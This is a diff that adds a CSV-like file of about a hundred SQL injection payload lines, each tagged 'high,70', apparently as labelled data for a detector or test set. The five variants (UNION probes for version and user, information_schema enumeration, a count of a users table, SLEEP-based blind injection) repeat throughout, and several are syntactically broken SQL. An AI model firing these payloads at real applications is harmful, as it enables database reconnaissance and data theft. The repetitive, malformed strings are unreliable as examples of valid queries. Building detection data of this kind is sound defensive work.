@@ -1,0 +1,101 @@
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL version() current_user AND UNION SELECT NULL database() schema_name FROM information_schema.schemata --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+' UNION SELECT NULL database() schema_name FROM information_schema.schemata AND 1=(SELECT COUNT(*) FROM users) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+1' UNION SELECT NULL version() current_user AND (SELECT sleep(5)) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --,high,70
+' UNION SELECT NULL version() current_user --,high,70
